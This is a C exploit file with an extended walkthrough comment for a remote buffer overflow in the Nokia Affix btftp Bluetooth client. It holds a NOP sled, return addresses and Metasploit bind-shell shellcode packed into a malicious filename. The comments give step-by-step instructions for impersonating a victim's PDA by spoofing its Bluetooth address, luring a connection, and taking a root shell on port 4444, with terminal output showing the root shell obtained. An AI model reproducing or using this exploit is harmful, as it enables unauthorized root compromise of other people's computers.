/*

- Tools you will probably need:
- http://www.digitalmunition.com/setbd-affix.c
- KF is one bad mofo /str0ke

Remote Nokia Affix btftp client exploit
by kf_lists[at]secnetops[dot]com

threat:~# btftp
Affix version: Affix 2.1.1
Wellcome to OBEX ftp. Type ? for help.
Mode: Bluetooth
SDP: yes
ftp> open 00:04:3e:65:a1:c8
Connected.
ftp> ls
Z8 ) Tnb 6 u u 3 ^v 0^ 5? 24 ?# V6 V
               )
         Xq X6 Y0

----------------------

root@frieza:/var/spool/affix/Inbox# telnet 192.168.1.207 4444
Trying 192.168.1.207...
Connected to 192.168.1.207.
Escape character is '^]'.
id;
uid=0(root) gid=0(root) groups=0(root)
: command not found
hostname;
threat
: command not found



*/

#include <stdio.h>
#include <strings.h>
main()
{
       FILE *malfile;

       /* linux_ia32_bind - LPORT=4444 Size=108 Encoder=Pex http://metasploit.com */
       unsigned char scode[] =
       "\x33\xc9\x83\xe9\xeb\xe8\xff\xff\xff\xff\xc0\x5e\x81\x76\x0e\x99"
       "\xee\x30\x5e\x83\xee\xfc\xe2\xf4\xa8\x35\x63\x1d\xca\x84\x32\x34"
       "\xff\xb6\xa9\xd7\x78\x23\xb0\xc8\xda\xbc\x56\x36\x88\xb2\x56\x0d"
       "\x10\x0f\x5a\x38\xc1\xbe\x61\x08\x10\x0f\xfd\xde\x29\x88\xe1\xbd"
       "\x54\x6e\x62\x0c\xcf\xad\xb9\xbf\x29\x88\xfd\xde\x0a\x84\x32\x07"
       "\x29\xd1\xfd\xde\xd0\x97\xc9\xee\x92\xbc\x58\x71\xb6\x9d\x58\x36"
       "\xb6\x8c\x59\x30\x10\x0d\x62\x0d\x10\x0f\xfd\xde";

       char buf[1024];
       memset(buf,'\0',sizeof(buf));
       memset(buf,'\x90',94);
       strcat(buf+94,"\x75\xfb\xff\xbf");
       strcat(buf+98,"\x75\xfb\xff\xbf");
       memset(buf+102,'\x90',40);
       strcat(buf+142,scode);

       if(!(malfile = fopen(buf,"w+"))) {
               printf("error opening file\n");
               exit(1);
       }

       fprintf(malfile, "pwned\n" );
       fclose(malfile);

}


/*
First lets find someone to impersonate.

root@frieza:~# btctl discovery
Searching 8 sec ...
Searching done. Resolving names ...
done.
+1: Address: 00:0c:76:46:f0:21, Class: 0xB20104, Key: "no", Name: "threat"
   Computer (Desktop) [Networking,Object Transfer,Audio,Information]
+2: Address: 00:10:60:29:4f:f1, Class: 0x420210, Key: "no", Name: "Bluetooth Modem"
   Phone (Wired Modem/VoiceGW) [Networking,Telephony]
+3: Address: 00:04:3e:65:a1:c8, Class: 0x120110, Key: "no", Name: "Pocket_PC"
   Computer (Handheld PC/PDA) [Networking,Object Transfer]

Lets pretend to be some poor chaps PDA.

root@frieza:~# ./setbd-affix 00:04:3e:65:a1:c8
Using BD_ADDR from command line
Setting BDA to 00:04:3e:65:a1:c8

root@frieza:~# btctl
bt0 01:02:03:04:05:06
       Flags: UP DISC CONN
       RX: acl:159 sco:0 event:97 bytes:4810 errors:0 dropped:0
       TX: acl:168 sco:0 cmd:29 bytes:19267 errors:0 dropped:0
       Security: service pair [-auth, -encrypt]
       Packets: DM1 DH1 DM3 DH3 DM5 DH5 HV1 HV3
       Role: deny switch, remain slave

root@frieza:~# btctl reset
root@frieza:~# btctl down
root@frieza:~# btctl up
btctl: cmd_initdev: Unable to start device (bt0)
root@frieza:~# btctl up
root@frieza:~# btctl
bt0 00:04:3e:65:a1:c8
       Flags: UP DISC CONN
       RX: acl:159 sco:0 event:126 bytes:5796 errors:0 dropped:0
       TX: acl:168 sco:0 cmd:52 bytes:19885 errors:0 dropped:0
       Security: service pair [-auth, -encrypt]
       Packets: DM1 DH1 DM3 DH3 DM5 DH5 HV1 HV3
       Role: deny switch, remain slave

root@frieza:~# btctl name "Pocket_PC"

God I love my ROK chip!

Wait for the poor chap to use his affix btftp to connect to his Pocket_PC.
Hopefully his bluetooth stack confuses us for his PDA.

Obviously you need to find out the general area of your shellcode and fix the exploit accordingly.

0xbffffb70: '\220' <repeats 40 times>,
"3 \203 ^\201v\016\231 0^\203 5c\035 \20424 x# V6\210 V\r\020\017Z8 a\b\020\017 )\210 Tnb\f )\210 \n\2042\a) \227 \222 Xq \235X6 \214Y0\020\rb\r\020\017 "

root@frieza:/var/spool/affix/Inbox# pico ../btftp-ex.c
root@frieza:/var/spool/affix/Inbox# cc -o ../btftp-ex ../btftp-ex.c
root@frieza:/var/spool/affix/Inbox# ../btftp-ex

Verify that a nice long file name is left behind.
root@frieza:/var/spool/affix/Inbox# ls
???????????????????????????????????????????????????????????????????????????
???????????????????u???u???????????????????????????????????????????3?????
?????^?v???0^??????5c???24????x#????V6??V???Z8??a?????)???Tnb????
?)?????2?)?????????Xq??X6??Y0??b?????

Start up the bluetooth services.
root@frieza:/etc/affix# btsrv -C ./btsrv.conf
btsrv: main: btsrv started [Affix 2.1.2].
btsrv: start_service: Bound service Serial Port to port 1
btsrv: start_service: Bound service Dialup Networking to port 2
btsrv: start_service: Bound service Dialup Networking Emulation to port 3
btsrv: start_service: Bound service Fax Service to port 4
btsrv: start_service: Bound service LAN Access to port 5
btsrv: start_service: Bound service OBEX File Transfer to port 6
btsrv: start_service: Bound service OBEX Object Push to port 7
btsrv: start_service: Bound service Headset to port 8
btsrv: start_service: Bound service HeadsetAG to port 9
btsrv: start_service: Bound service HandsFree to port 10
btsrv: start_service: Bound service HandsFreeAG to port 11

Wait for the person to connect to your device and attempt to perform a file listing.
This of course will trigger the overflow and execute your shellcode
threat:~# btftp
Affix version: Affix 2.1.1
Wellcome to OBEX ftp. Type ? for help.
Mode: Bluetooth
SDP: yes
ftp> open 00:04:3e:65:a1:c8
Connected.
ftp> ls
Z8 ) Tnb 6 u u 3 ^v 0^ 5? 24 ?# V6 V
               )
         Xq X6 Y0

You can tell when they have connected via the following log file entries.

btsrv: handle_input: Connection from 00:02:01:44:ad:99
channel 6 (OBEX File Transfer Profile)
btsrv: execute_cmd: Socket multiplexed to stdin/stdout
btsrv: signal_handler: Sig handler : 2

After they have done so you will use the PAND connection you already hacked to obtain your shell. =]
Or perhaps write some bluetooth aware shellcode.

root@frieza:/var/spool/affix/Inbox# telnet 192.168.1.207 4444
Trying 192.168.1.207...
Connected to 192.168.1.207.
Escape character is '^]'.
id;
uid=0(root) gid=0(root) groups=0(root)
: command not found
hostname;
threat
: command not found
*/
